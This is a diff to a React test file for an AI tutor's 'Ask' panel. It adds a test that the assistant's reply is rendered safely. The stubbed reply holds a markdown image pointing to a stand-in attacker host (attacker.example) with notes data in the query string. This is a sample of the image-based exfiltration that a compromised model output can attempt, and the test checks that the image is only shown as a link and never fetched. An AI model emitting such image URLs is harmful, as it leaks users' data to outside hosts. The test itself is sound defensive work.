@@ -1,7 +1,7 @@
 // @vitest-environment jsdom
 import { act, createElement } from "react";
 import { createRoot, type Root } from "react-dom/client";
-import { afterEach, beforeAll, describe, expect, it } from "vitest";
+import { afterEach, beforeAll, describe, expect, it, vi } from "vitest";
 
 import { AskableTitle } from "./AskableTitle";
 import { askFieldEscape } from "./AskPanel";
@@ -19,6 +19,7 @@ beforeAll(() => {
 
 let root: Root | null = null;
 afterEach(() => {
+  vi.unstubAllGlobals();
   act(() => root?.unmount());
   root = null;
   document.body.replaceChildren();
@@ -86,5 +87,31 @@ describe("askFieldEscape", () => {
     expect(askFieldEscape("Escape", false, false)).toBe(false);
     expect(askFieldEscape("Escape", true, true)).toBe(false);
     expect(askFieldEscape("Enter", true, false)).toBe(false);
+  });
+});
+
+describe("Ask's answer", () => {
+  it("shows a markdown image in the tutor's reply as a link, and never fetches it", async () => {
+    vi.stubGlobal(
+      "fetch",
+      vi.fn(async () =>
+        new Response(JSON.stringify({ message: { role: "assistant", content: "See below.\n\n![chart](https://attacker.example/p.png?d=notes)" } }), {
+          status: 200,
+        }),
+      ),
+    );
+    const { ask, field } = mount();
+    act(() => ask.click());
+    type(field, "What is the TLB?");
+    await act(async () => {
+      field.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true, cancelable: true }));
+      await new Promise((resolve) => setTimeout(resolve, 0));
+    });
+    await act(async () => {
+      await new Promise((resolve) => setTimeout(resolve, 0));
+    });
+    expect(document.body.textContent).toContain("chart");
+    expect(document.querySelector("img")).toBeNull();
+    expect(document.querySelector('a[href^="https://attacker.example/"]')?.textContent).toBe("chart");
   });
 });
